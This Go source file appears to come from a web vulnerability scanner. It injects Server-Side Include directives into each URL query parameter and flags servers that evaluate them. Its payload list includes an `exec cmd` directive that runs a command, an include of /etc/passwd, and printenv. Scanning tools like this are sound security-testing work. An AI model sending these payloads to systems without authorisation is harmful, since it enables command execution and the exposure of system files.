package scanner

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/temren/pkg/httpengine"
)

// SSIInjectionScanner injects Server-Side Include directives and watches for
// shell metadata in the response (mostly Apache mod_include leftovers).
type SSIInjectionScanner struct{}

func NewSSIInjectionScanner() *SSIInjectionScanner { return &SSIInjectionScanner{} }

func (s *SSIInjectionScanner) Name() string { return "Server-Side Include (SSI) Injection" }

var ssiPayloads = []string{
	`<!--#exec cmd="id" -->`,
	`<!--#echo var="DOCUMENT_NAME" -->`,
	`<!--#include virtual="/etc/passwd" -->`,
	`<!--#printenv -->`,
}

func (s *SSIInjectionScanner) Scan(ctx context.Context, target string, client *httpengine.Client) ([]Finding, error) {
	u, err := url.Parse(target)
	if err != nil || u == nil {
		return nil, err
	}
	q := u.Query()
	if len(q) == 0 {
		return nil, nil
	}
	var findings []Finding
	for param := range q {
		for _, p := range ssiPayloads {
			tq := url.Values{}
			for k, v := range q {
				if k == param {
					tq.Set(k, p)
				} else {
					tq.Set(k, v[0])
				}
			}
			u.RawQuery = tq.Encode()
			req, _ := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
			resp, err := client.Do(ctx, req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
			resp.Body.Close()
			low := strings.ToLower(string(body))
			if strings.Contains(low, "uid=") || strings.Contains(low, "document_name") ||
				strings.Contains(low, "root:") || strings.Contains(low, "path=") && strings.Contains(low, "remote_addr") {
				findings = append(findings, Finding{
					URL: u.String(), Title: "Server-Side Include Injection",
					Description: "SSI directive evaluated by the server. Often grants command execution on legacy Apache deployments.",
					Severity: SeverityCritical, Confidence: ConfidenceHigh, Scanner: s.Name(),
					Parameter: param, Payload: p, Timestamp: time.Now(),
					OWASPCategory: "A03:2021-Injection", CVSSScore: 9.8,
				})
				return findings, nil
			}
		}
	}
	return findings, nil
}
